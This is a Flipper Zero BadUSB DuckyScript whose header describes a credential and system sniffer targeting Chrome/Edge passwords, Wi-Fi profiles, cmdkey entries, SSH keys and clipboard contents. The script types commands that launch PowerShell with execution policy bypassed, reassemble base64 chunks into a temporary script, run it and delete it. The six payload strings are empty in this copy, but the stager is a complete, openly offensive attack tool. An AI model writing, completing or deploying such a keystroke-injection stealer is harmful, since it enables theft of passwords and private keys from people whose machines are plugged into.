REM ============================================
REM Flipper Zero: System & Network Sniffer v3
REM Added: Chrome/Edge passwords, netstat, ARP,
REM        all Wi-Fi nets, cmdkey, clipboard,
REM        SSH keys, git config, recent files
REM b64 split into 6 chunks ~3.5KB each
REM ============================================

DELAY 1000
GUI r
DELAY 700
STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Normal
DELAY 500
ENTER
DELAY 1400

STRING $a=''
ENTER
DELAY 200
STRING $b=''
ENTER
DELAY 200
STRING $c=''
ENTER
DELAY 200
STRING $d=''
ENTER
DELAY 200
STRING $e=''
ENTER
DELAY 200
STRING $f2=''
ENTER
DELAY 200

STRING $f=[IO.Path]::GetTempFileName()+'.ps1';[IO.File]::WriteAllBytes($f,[Convert]::FromBase64String($a+$b+$c+$d+$e+$f2));& $f;Remove-Item $f -Force -EA 0
ENTER
